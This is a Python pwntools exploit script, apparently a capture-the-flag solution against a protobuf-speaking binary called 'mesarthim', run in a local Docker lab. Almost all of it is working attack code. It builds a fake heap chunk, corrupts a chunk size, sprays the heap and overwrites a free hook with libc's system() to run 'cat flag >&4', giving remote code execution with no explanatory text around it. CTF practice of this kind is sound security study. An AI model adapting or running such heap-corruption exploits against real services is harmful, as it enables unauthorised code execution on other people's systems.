```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ vagd template ../attachments/share/mesarthim localhost 5000 -e --image debian:13-slim@sha256:1caf1c703c8f7e15dcf2e7769b35000c764e6f50e4d7401c355fb0248f3ddfdb
from pwn import *
import mesarthim_pb2


GOFF   = 0x555555554000                               # GDB default base address
IP     = 'localhost'                                  # remote IP
PORT   = 5000                                         # remote PORT
BINARY = '../attachments/share/mesarthim'             # PATH to local binary
ARGS   = []                                           # ARGS supplied to binary
ENV    = {'PATH':'/usr/bin'}                          # ENV supplied to binary
BOX    = 'debian:13-slim@sha256:1caf1c703c8f7e15dcf2e7769b35000c764e6f50e4d7401c355fb0248f3ddfdb' # Docker box image

# GDB SCRIPT, executed at start of GDB session (e.g. set breakpoints here)
GDB    = f"""
set follow-fork-mode parent

set glibc 2.41

c"""

context.binary = exe = ELF(BINARY, checksec=False)    # binary
context.aslr = False                                  # ASLR enabled (only GDB)

# abbreviations
cst = constants
shc = shellcraft

# logging
linfo = lambda x, *a: log.info(x, *a)
lwarn = lambda x, *a: log.warn(x, *a)
lerr  = lambda x, *a: log.error(x, *a)
lprog = lambda x, *a: log.progress(x, *a)
lhex  = lambda x, y="leak": linfo(f"{x:#018x} <- {y}")
phex  = lambda x, y="leak": print(f"{x:#018x} <- {y}")

# type manipulation
byt   = lambda x: x if isinstance(x, (bytes, bytearray)) else f"{x}".encode()
rpad  = lambda x, s=8, v=b"\0": x.ljust(s, v)
lpad  = lambda x, s=8, v=b"\0": x.rjust(s, v)
hpad  = lambda x, s=0: f"%0{s if s else ((x.bit_length() // 8) + 1) * 2}x" % x
upad  = lambda x: u64(rpad(x))
cpad  = lambda x, s: byt(x) + cyc(s)[len(byt(x)):]
tob   = lambda x: bytes.fromhex(hpad(x))

# elf aliases
gelf  = lambda elf=None: elf if elf else exe
srh   = lambda x, elf=None: gelf(elf).search(byt(x)).__next__()
sasm  = lambda x, elf=None: gelf(elf).search(asm(x), executable=True).__next__()
lsrh  = lambda x: srh(x, libc)
lasm  = lambda x: sasm(x, libc)

# cyclic aliases
cyc = lambda x: b'A'*x
cfd = lambda x: cyclic_find(x)
cto = lambda x: cyc(cfd(x))

# tube aliases
t   = None
gt  = lambda at=None: at if at else t
sl  = lambda x, t=None, *a, **kw: gt(t).sendline(byt(x), *a, **kw)
se  = lambda x, t=None, *a, **kw: gt(t).send(byt(x), *a, **kw)
ss  = (
        lambda x, s, t=None, *a, **kw: sl(x, t, *a, **kw)
        if len(x) < s
        else se(x, *a, **kw)
          if len(x) == s
          else lerr(f"ss to big: {len(x):#x} > {s:#x}")
      )
sla = lambda x, y, t=None, *a, **kw: gt(t).sendlineafter(
        byt(x), byt(y), *a, **kw
      )
sa  = lambda x, y, t=None, *a, **kw: gt(t).sendafter(byt(x), byt(y), *a, **kw)
sas = (
        lambda x, y, s, t=None, *a, **kw: sla(x, y, t, *a, **kw)
        if len(y) < s
        else sa(x, y, *a, **kw)
          if len(y) == s
          else lerr(f"ss to big: {len(x):#x} > {s:#x}")
      )
ra  = lambda t=None, *a, **kw: gt(t).recvall(*a, **kw)
rl  = lambda t=None, *a, **kw: gt(t).recvline(*a, **kw)
rls = lambda t=None, *a, **kw: rl(t=t, *a, **kw)[:-1]
rcv = lambda x, t=None, *a, **kw: gt(t).recv(x, *a, **kw)
ru  = lambda x, t=None, *a, **kw: gt(t).recvuntil(byt(x), *a, **kw)
it  = lambda t=None, *a, **kw: gt(t).interactive(*a, **kw)
cl  = lambda t=None, *a, **kw: gt(t).close(*a, **kw)


# setup vagd vm
vm = None
def setup():
  global vm
  if args.REMOTE or args.LOCAL:
    return None

  try:
    # only load vagd if needed
    from vagd import Dogd, Box
  except ModuleNotFoundError:
    log.error('Failed to import vagd, run LOCAL/REMOTE or install it')
  if not vm:
    vm = Dogd(BINARY, image=BOX, forward={'5000/tcp':5001}, 
              symbols=True, ex=True, fast=True)  # Docker
  if vm.is_new:
    # additional setup here
    log.info('new vagd instance')
    vm.system('echo NOT_THE_FLAG | sudo tee flag').recvall()

  return vm


# get target (pwnlib.tubes.tube)
def get_target(**kw):
  if args.REMOTE:
    # context.log_level = 'debug'
    return remote(IP, PORT)

  if args.LOCAL:
    if args.GDB:
      return gdb.debug([BINARY] + ARGS, env=ENV, gdbscript=GDB, **kw)
    return process([BINARY] + ARGS, env=ENV, **kw)

  return vm.start(argv=ARGS, env=ENV, gdbscript=GDB, **kw)


vm = setup()

#===========================================================
#                   EXPLOIT STARTS HERE
#===========================================================
# Arch:       amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        PIE enabled
# Stripped:   No
# Comment:    GCC: (Debian 14.2.0-19) 14.2.0

# libc = ELF('', checksec=False)

FRAME_HEADER = 5
def recv_frame():
  buf = b''
  header = None
  for _ in range(FRAME_HEADER):
    buf += rcv(1)
    try:
      header = mesarthim_pb2.Frame.FromString(buf)
      break
    except Exception:
      pass
  if header is None:
    lerr("Failed to receive frame header")
  buf += rcv(header.size - len(buf))
  frame = None
  try:
    frame = mesarthim_pb2.Frame.FromString(buf)
  except Exception as e:
    frame = header
  return frame, buf

inpt_file = open('input', 'wb')

def send_frame(frame):
  assert frame.size == frame.ByteSize()
  # linfo(f"Sending  frame: {frame.size:#04x}")
  frame_buf = bytearray(frame.SerializeToString())
  # linfo(f"Raw:\n{hexdump(frame_buf)}")
  se(frame_buf)
  inpt_file.write(frame_buf)

def send_frame_buf(buf, cmd=mesarthim_pb2.Commands.PING):
  frame = mesarthim_pb2.Frame()
  frame.cmd = cmd
  frame.status.name = buf

  frame.size = frame.ByteSize()
  frame.size = frame.ByteSize()
  frame.size = frame.ByteSize()

  send_frame(frame)


def send_frame_sz(size):
  send_frame_buf(cyc(size-0x8))

def send_crpt(sz):
  send_frame_buf(cyc(0x76) + p8(sz), 8)

def send_spray(buf, sprays):
  frame = mesarthim_pb2.Frame()
  frame.cmd = mesarthim_pb2.Commands.PING
  frame.status.name = buf
  for s in sprays:
    frame.spray.append(s)
  frame.size = frame.ByteSize()
  frame.size = frame.ByteSize()
  frame.size = frame.ByteSize()
  send_frame(frame)

def send_rce(spray):
  frame = mesarthim_pb2.RceFrame()
  frame.cmd = mesarthim_pb2.Commands.PING
  for s in spray:
    frame.spray.append(s)
  frame.size = frame.ByteSize()
  frame.size = frame.ByteSize()
  frame.size = frame.ByteSize()
  send_frame(frame)
    

s = get_target()
if not args.REMOTE:
  sleep(2 if args.GDB else .1)
t = s if args.REMOTE else remote('localhost', 5001)

fake = flat({
  8: 0x101,
}, filler=b"A", length=0x78)

send_frame_buf(fake, mesarthim_pb2.Commands.SET_NAME)

send_frame_sz(0x78)
send_crpt(0xd1)

send_spray(cyc(0x80), [cyc(0x80)]*2)

crpt = flat({
  cfd('abfa'): [
    0x81,
    0x200000004,
    2,
    exe.sym.g_name+0x10
  ]
}, filler=b"A", length=0xc0)

send_spray(cyc(0x70), [crpt] + [p8(i) for i in range(3)] + [cyc(0x40)])

rce = flat({
  0: 'cat flag >&4\0',
  cfd('abda'): [
    0x6fe1be2,       # alloc
    exe.sym.__libc_system, # free
    exe.sym.g_name + 0x12, # rdi
  ]
}, filler=b"A", length=0xf0)

send_spray(b'', [rce])
t.shutdown('send')
print(ra())
inpt_file.close()

# it()
 
# recv_frame()
# recv_frame()
# rcv(0x89)
# frame, buf = recv_frame()
# linfo(f"Raw:\n{hexdump(buf)}")


# s.interactive() # or it()
```
